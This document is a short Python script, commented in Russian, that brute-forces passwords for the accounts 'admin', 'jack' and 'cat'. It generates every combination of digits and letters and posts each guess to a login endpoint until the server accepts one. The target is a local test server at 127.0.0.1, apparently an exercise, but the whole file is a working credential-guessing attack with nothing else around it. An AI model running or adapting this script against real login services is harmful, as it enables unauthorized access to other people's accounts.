import requests
from string import ascii_letters as alphabet

state = 0
alphabet = '*' + ''.join((str(i) for i in range(10))) + alphabet    # включая буквы в верхнем регистре
                                                                                # для увеличения скорости перебора можно заменить на .ascii_lowercase
def to_alphabet(n):
    base = len(alphabet)
    result = ''
    while n != 0:
        rest = n % base
        result = alphabet[rest] + result
        n //= base
    return result.replace('*', '')                                              # более удобный метод для очистки


def next_password():
    global state
    result = to_alphabet(state)
    state += 1
    return result


def start_bruteforce(login, pass_pattern):
    while True:
        global pass_list
        password = pass_pattern + next_password()
        data = {'login': login, 'password': password}
        response = requests.post('http://127.0.0.1:5000/auth', json=data)
        if response.status_code == 200:
            print('Password %s for %s Found!' % (password, login))
            global state
            state = 0
            pass_list.append(password)
            break
        else:
            # print(f'{password=} is incorrect')
            pass                                        # раскомментировать строку выше для наблюдения процесса


if __name__ == '__main__':
    pass_list = []
    login_list = ['admin', 'jack', 'cat']
    for login in login_list:
        password = ''
        start_bruteforce(login, password)
    print(dict(zip(login_list, pass_list)))
